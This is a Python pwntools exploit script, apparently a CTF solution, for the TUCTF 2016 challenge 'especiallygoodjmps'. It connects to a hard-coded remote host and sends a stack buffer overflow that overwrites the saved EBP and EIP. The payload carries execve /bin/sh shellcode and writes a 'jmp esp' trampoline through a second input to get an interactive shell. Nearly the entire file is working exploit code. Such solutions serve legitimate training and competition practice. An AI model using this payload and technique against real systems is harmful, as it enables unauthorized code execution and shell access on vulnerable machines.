#!/usr/bin/env python
#
# TUCTF 2016
# especiallygoodjmps (PWN/75)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

from pwn import *
from struct import pack as p, unpack as u

host, port = ('130.211.202.98', 7575)

r = remote(host, port)

# prepare eip + ebp overwrite values
new_eip = p('<I', 0x0804A048) # > 0804A048 meow 
new_ebp = p('<I', 0xDEADBEEF)

# prepare shellcode 
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# prepare payload
payload = "B"*40 + new_ebp + new_eip + shellcode

# send payload to victim
print r.recvuntil('What\'s your name?\n')
r.sendline(payload)
print r.recvuntil('What\'s your favorite number?\n')

# construct 4-byte trampoline in meow
h = '\x90\x90\xff\xe4' # jmp esp = ff e4
trampoline = u('<i', h)
r.sendline("%d" % trampoline) 

# enjoy your shell
r.interactive()
r.close()
